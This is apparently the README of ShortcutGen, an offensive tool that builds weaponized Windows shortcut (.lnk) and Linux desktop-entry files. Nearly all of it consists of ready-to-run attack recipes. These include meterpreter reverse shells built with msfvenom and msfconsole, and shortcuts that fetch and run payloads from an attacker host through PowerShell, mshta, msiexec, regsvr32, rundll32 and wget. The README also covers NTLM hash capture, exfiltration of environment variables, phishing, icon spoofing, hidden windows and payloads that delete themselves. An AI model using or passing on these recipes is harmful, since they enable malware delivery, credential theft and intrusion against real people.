# ShortcutGen

**ShortcutGen (short for Shortcut Generator)** is a script that generates shortcut files as weaponized payloads. Ever since [lnk2pwn](https://github.com/it-gorillaz/lnk2pwn) was at it's prime to generate windows shortcut (`.lnk`) files. However, security vendors were able to trigger the static signature as malicious due to it's outdated library. [MisterioLNK](https://github.com/Kingcagsi/MisterioLNK) exists but it's designed to work in the Windows operating system. I knew I needed something to get away from it to keep everything mobile in the Linux workspace. Providentially, all thanks to Microsoft for releasing [PowerShell](https://github.com/PowerShell/PowerShell) and `wine` are the solution to this problem. In addition, another attack vector for targeting Linux desktops is the desktop entry (`.desktop`).

## Installation

Run the installer. It'll install the required dependencies.

```
$ bash -c "$(curl --proto '=https' --tlsv1.2 -sSfL "https://raw.githubusercontent.com/U53RW4R3/ShortcutGen/master/install.sh")"

$ bash -c "$(wget -qO - "https://raw.githubusercontent.com/U53RW4R3/ShortcutGen/master/install.sh")"
```

## Help Menu

```
$ shortcutgen -h
Usage: shortcutgen <flags>
    -p, --payload                       Specify a payload module ('lnk', 'desktop').
    -c, --command                       Specify a command to execute.
    -a, --arguments                     Optionally pass the arguments (except it is
                                        mandatory for 'lnk' payload module).
    -i, --ip                            Specify an IP address/hostname (applies with
                                        'lnk' payload module).
    -e, --environment                   Optionally pass the environment variables to
                                        exfiltrate.
    -s, --share                         Specify an SMB share (applies with -h flag
                                        when it's optional for 'lnk' payload module).
    -n, --name                          Specify a name. It is optional when 'lnk'
                                        payload module is specified (applies with -h flag).
                                        For 'desktop' payload module it is mandatory.
    -d, --description                   Specify the description of the payload.
    -ic, --icon                              Specify a custom icon.
    -w, --window                        Specify a window. For 'lnk' payload windowstyle
                                        'normal' is set by default if not specified.
                                        The available windowstyles are: 'normal', 'maximized',
                                        and 'minimized'. For 'desktop' payload it is set to
                                        'false', the available options are: 'true' and 'false'.
    -wd, --workingdirectory                  Specify a working directory.
    -o, --output                        Specify an output.
    -v, --verbose                       Display more information.
    -V, --version                       Display the program's version number.
    -h, --help                          Display the help menu.
```

## Usage

### 0x00 - Trojanized Shortcuts

#### Fileless Payloads

##### Windows

TODO: Rewrite this when to use verbose.

Generate the shell link then pack it with the PE EXEcutable dropper (`.exe`) payload to trigger it. Error by enabling verbose (`-v`).

```
$ msfvenom -p windows/x64/meterpreter/reverse_tcp lhost=<IP> lport=<PORT> -f exe -o payload.exe

$ sudo msfconsole -qx "use exploit/multi/handler; set payload windows/x64/meterpreter/reverse_tcp; set lhost <IP>; set lport 443; run"

$ shortcutgen -p lnk -c "C:\Windows\System32\cmd.exe" -a "/c .\payload.exe" -o payload.lnk

$ 7z a -tzip -mx=9 archive.zip payload.*
```

Generate the shell link then pack it with the Dynamic Link Library dropper (`.dll`) payload to trigger it.

```
$ msfvenom -p windows/x64/meterpreter/reverse_tcp lhost=<IP> lport=<PORT> -f dll -o payload.dll

$ sudo msfconsole -qx "use exploit/multi/handler; set payload windows/x64/meterpreter/reverse_tcp; set lhost <IP>; set lport 443; run"

$ shortcutgen -p lnk -c "C:\Windows\System32\cmd.exe" -a "/c rundll32.exe .\payload.dll,StartW" -o payload.lnk

$ 7z a -tzip -mx=9 archive.zip payload.*
```

Generate the shell link while hosting a webserver to stage a PowerShell (`.ps1`) payload to trigger it.

```
$ msfvenom -p windows/x64/meterpreter/reverse_tcp lhost=<IP> lport=<PORT> -f psh-reflection -o payload.ps1

$ sudo msfconsole -qx "use exploit/multi/handler; set payload windows/x64/meterpreter/reverse_tcp; set lhost <IP>; set lport 8443; run"

$ sudo python -m http.server 80

$ shortcutgen -p lnk -c "C:\Windows\SysWOW64\WindowsPowershell\v1.0\powershell.exe" -a "-nop -NonI -Nologo -w hidden -c \`\"IEX ((New-Object Net.WebClient).DownloadString('http[s]://<attacker_IP>/payload.ps1'))" -o payload.lnk
```

Generate the shell link while hosting a webserver to stage a MSI installer (`.msi`) payload to trigger it.

```
$ msfvenom -p windows/x64/meterpreter/reverse_tcp lhost=<IP> lport=<PORT> -f msi -o payload.msi

$ sudo msfconsole -qx "use exploit/multi/handler; set payload windows/x64/meterpreter/reverse_tcp; set lhost <IP>; set lport <PORT>; run"

$ sudo python -m http.server 80

$ shortcutgen -p lnk -c "C:\Windows\System32\msiexec.exe" -a "/quiet /qn /i http://<attacker_IP>/payload.msi" -o payload.lnk
```

Generate the shell link then automatically hosting a staging HTA payload (`.hta`) using `metasploit-framework` exploit module `exploit/windows/misc/hta_server`.

```
$ sudo msfconsole -qx "use exploit/windows/misc/hta_server; set target 2; set payload windows/x64/meterpreter/reverse_tcp; set lhost <IP>; set lport 8443; set srvhost <server_IP>; set srvhost <server_IP>; set srvport <server_PORT>; run"

$ shortcutgen -p lnk -c "C:\Windows\System32\mshta.exe" -a "http[s]://<attacker_IP>/payload.hta" -o payload.lnk
```

Generate the shell link then automatically hosting a staging DLL payload (`.dll`) using `metasploit-framework` exploit module `exploit/windows/smb/smb_delivery`.

```
$ sudo msfconsole -qx "use exploit/windows/smb/smb_delivery; set payload windows/x64/meterpreter/reverse_tcp; set lhost <IP>; set lport 8443; set srvhost <server_IP>; set file_name payload.dll; set share staging; run"

$ shortcutgen -p lnk -c "C:\Windows\System32\rundll32.exe" -a "\\<attacker_IP>\staging\payload.dll,0" -o payload.lnk
```

Generate the shell link then automatically hosting a staging scriptlet payload (`.sct`) using `metasploit-framework` exploit module `exploit/multi/script/web_delivery`.

```
$ sudo msfconsole -qx "use exploit/multi/script/web_delivery; set target 3; set payload windows/x64/meterpreter/reverse_tcp; set lhost <IP>; set lport 8443; set srvhost <server_IP>; set srvport <server_PORT>; set uripath payload; run"

$ shortcutgen -p lnk -c "C:\Windows\System32\regsvr32.exe" -a "/s /n /u /i://http://<attacker_IP>:<attacker_PORT>/payload.sct scrobj.dll" -o payload.lnk
```

##### Linux

Generate the desktop entry then automatically hosting a python payload (`.py`) using `metasploit-framework` exploit module `exploit/multi/script/web_delivery`.

```
$ sudo msfconsole -qx "use exploit/multi/script/web_delivery; set target 0; set payload python/meterpreter/reverse_tcp; set lhost <IP>; set lport 8443; set srvhost <server_IP>; set srvport <server_PORT>; set uripath payload; run"

$ shortcutgen -p desktop -n "Document File" -c "python" -a "\"<payload>\"" -o payload.desktop
```

#### Dropper Payloads

The working directory (`-wd`) will be executed if you placed a dropper that touches the disk unless you're staging it so be careful with this option.

##### Windows

TODO: Update the documentation when using working directory for downloading and executing dropper payload.exe and test it. Use `curl.exe`, `certutil.exe`, `bitsadmins.exe` and `powershell.exe` as an example.

```
$ shortcutgen -p lnk -c "C:\Windows\System32\cmd.exe" -a "" -wd "C:\\Users\\Public\\" -o payload.lnk
```

##### Linux

Generate the desktop entry then automatically hosting an ELF payload using `metasploit-framework` exploit module `exploit/multi/script/web_delivery`.

```
$ sudo msfconsole -qx "use exploit/multi/script/web_delivery; set target 7; set payload linux/x64/meterpreter/reverse_tcp; set lhost <IP>; set lport 8443; set srvhost <server_IP>; set srvport <server_PORT>; set uripath payload; run"

$ shortcutgen -p desktop -n "Document File" -c "wget" -a "wget -qO payload --no-check-certificate http://<attacker_IP>/payload; chmod +x payload; ./payload& disown" -ic "libreoffice-writer" -wd "/tmp/" -o payload.desktop
```

### 0x02 - Relay NTLM Hash

Specify the attacker's IP address.

```
$ sudo responder -I <interface> -A

$ shortcutgen -p lnk -i "192.168.1.4" -s "Documents" -n "document.docx" -o payload.lnk
```

Even a rouge hostname can trigger the DNS.

```
$ sudo responder -I <interface> -wd

$ shortcutgen -p lnk -i "fileserver" -s "Documents" -n "document.docx" -o payload.lnk
```

TODO: Test this

To exfiltrate environment variables.

```
$ sudo msfconsole -qx "use auxiliary/server/capture/smb; set domain <DOMAIN_NAME>; set srvhost 0.0.0.0; set srvport 445; set timeout 10; run -j"

$ shortcutgen -p lnk -i "fileserver" -e "COMPUTERNAME,USERNAME,NUMBER_OF_PROCESSORS" -s "Documents" -n "document.docx" -o payload.lnk
```

### 0x03 - Phishing

You can send a targeted phishing campaign using chromium-based web browsers in application mode from [mrd0x's blog post](https://mrd0x.com/phishing-with-chromium-application-mode/).

```
$ shortcutgen -p lnk -c "C:\Program Files (x86)\Microsoft\Edge\Application\msedge.exe" -a "--app=http://192.168.1.4" -ic "C:\Program Files (x86)\Microsoft\Edge\Application\msedge.exe,0" -o Office365.lnk
```

### 0x04 - Maintaining Access

TODO: Maybe write about it when using `schtasks.exe`

### 0x05 - Defense Evasion

#### Hidden Window

##### Windows

TODO: Create a table

```
$ shortcutgen -p lnk -c "C:\Windows\System32\cmd.exe" -a "/c .\payload.exe" -w "minimized" -o payload.lnk
```

#### Linux

TODO: Create a table

By default it's set to "true" or "false"

```
$ shortcutgen -p desktop -n "Document File" -c "python" -a "\"<payload>\"" -w "false" -o payload.desktop
```

#### Spoof Icons

##### Windows

For a custom icon (`-ic`) you must either specify an index or an absolute path of the file/executable and the suffix with a zero (e.g., `C:\path\to\file.extension,0`) otherwise it won't generate and result an error by enabling verbose (`-v`). Name the payload by spoofing the icon by appending (e.g., `payload.docx.lnk`).

TODO: Create a document .docx with libreoffice to spoof the icon

```
$ msfvenom -p windows/x64/meterpreter/reverse_tcp lhost=<IP> lport=<PORT> -f exe -o payload.exe

$ sudo msfconsole -qx "use exploit/multi/handler; set payload windows/x64/meterpreter/reverse_tcp; set lhost <IP>; set lport 443; run"

$ shortcutgen -p lnk -c "C:\Windows\System32\cmd.exe" -a "/c .\payload.exe" -ic "%CD%\document.docx,0" -w "minimized" -o payload.docx.lnk

$ 7z a -tzip -mx=9 archive.zip payload.*
```

##### Linux

Generate the desktop entry then automatically hosting a python payload (`.py`) using `metasploit-framework` exploit module `exploit/multi/script/web_delivery`.

```
$ sudo msfconsole -qx "use exploit/multi/script/web_delivery; set target 0; set payload python/meterpreter/reverse_tcp; set lhost <IP>; set lport 8443; set srvhost <server_IP>; set srvport <server_PORT>; set uripath payload; run"

$ shortcutgen -p desktop -n "Document File" -c "python" -a "\"<payload>\"" -ic "libreoffice-writer" -o payload.desktop
```

#### Anti-Forensics

##### Windows

> [!INFO]
> The deletion method won't work if the disk image is read-only.

You can of course self delete the payload after execution.

```
$ shortcutgen -p lnk -c "C:\Windows\System32\cmd.exe" -a "/c mshta.exe http[s]://<attacker_IP>/payload.hta & del %CD%\payload.lnk" -ic "C:\path\to\file.extension,0" -w "minimized" -wd "C:\\Users\\Public\\" -o payload.lnk
```

##### Linux

Including `.desktop` file.

```
$ shortcutgen -p desktop -n "Document File" -c "wget" -a "wget -qO payload --no-check-certificate http://192.168.1.4/payload; chmod +x payload; ./payload& disown;sleep 2; rm \$(pwd)/payload.desktop" -wd "/tmp/" -w "false" -o payload.desktop
```

## Limitations

### Winetricks (As a Package Manager)

- `winetricks` has PowerShell avaliable for easier installation. It's stable enough for sure. However, I've used the latest version instead and it works as expected.

### Wine

- The **HotKey** has not been implemented in `wine` so I can't make a feature for persistence. So much potential with this shortcut is gone :(

- A minor limitation that `wine` requires a path to be as a string instead of a file when choosing file formats as custom icons. Including the file's presence.

- `wine` could not process the environment variable when inserting the modulus character (e.g., `%WINDIR\system32\cmd.exe`) when specifying the **TargetPath**. It'll result something like this `Z:\home\username\%WINDIR%\System32\cmd.exe`.

- Even specifying the IP address in the **TargetPath** will be malformed. It'll result something like this `Z:\home\username\\127.0.0.1\share_name\file.extension`.

- Creating polyglot is not possible with `wine`'s own `copy` command. Only Windows native `copy` command works.

### Windows Operating System

- Windows 11 operating system have disabled short filenames by default that could've used for obfuscation. Oh well nothing I could about it since it's a legacy technology.

## FAQ (Frequent Asked Questions)

### Why didn't you use [pylnk](https://github.com/strayge/pylnk) library?

I could but I decided to implement a wrapper with `wine` which is much more suitable in a long term. Saves me a lot of trouble from reinventing my own library in case it gets abandoned. It's often best to explore more options to produce similar results.

### I want to understand how the Windows shell link works. Is there a technical whitepaper that does help me to make my own library?

The official Microsoft's own **MS-SHLLINK binary file format** can found [here](https://learn.microsoft.com/en-us/openspecs/windows_protocols/ms-shllink/16cb4ca1-9339-4d0c-a68d-bf1d6cc0f943?redirectedfrom=MSDN).

### If you absolutely do not want to use the Windows OS then how can I get away with it

- `docker` does get the job done but as a tradeoff Windows is hungry for resources. It should be fine with a few gigabytes of size to host it in a container. Probably for my next project since everything is treated as an experiment.

### Can I use the techniques for my project or other tradecraft for my own arsenal?

It is highly encouraged of you to understand how the shortcut generator is being processed then outputted. The GNU GPLv3 copyleft license grants you the right to inspect the source code, modify it to your needs, and redistribute with your own copy along with the source code.

## Troubleshooting

### Malformed Payloads

Use `exiftool` to check the payload's content. Often times you'll mistakenly included escape sequences or special characters that aren't escaped properly. For example when I include the icon's placeholder as an example.

```
$ shortcutgen -p lnk -c "C:\Windows\System32\cmd.exe" -a "/c mshta.exe http[s]://<attacker_IP>/payload.hta & del %CD%\payload.lnk" -ic "C:\path\to\file.extension,0"
```

### Uninstall

To uninstall the programs.

```
$ sudo rm -f /usr/local/src/shortcutgen.sh /usr/local/bin/shortcutgen
```

Uninstall PowerShell in the wine environment.

```
$ wine uninstaller --list

$ wine uninstaller --remove {<GUID>}
```

You can optionally delete the default `WINEPREFIX` in your `$HOME` directory.

```
$ sudo rm -rf ~/.wine/
```

## References

- [\[MS-SHLLINK\]: Shell Link (.LNK) Binary File Format](https://learn.microsoft.com/en-us/openspecs/windows_protocols/ms-shllink/16cb4ca1-9339-4d0c-a68d-bf1d6cc0f943?redirectedfrom=MSDN)

- [Exiftool: LNK Tags](https://exiftool.org/TagNames/LNK.html)

- [lnk2pwn](https://github.com/it-gorillaz/lnk2pwn)

- [MisterioLNK](https://github.com/Kingcagsi/MisterioLNK)

- [LNKUp](https://github.com/Plazmaz/LNKUp)

- [pylnk](https://github.com/strayge/pylnk)

- [mslnk](https://github.com/gotopkg/mslnk)

- [mslinks](https://github.com/vatbub/mslinks)

## Credits

- [tommelo](https://github.com/tommelo)

## Disclaimer

It is your responsibility depending on whatever the cause of your actions user. Remember that with great power comes great responsibility.
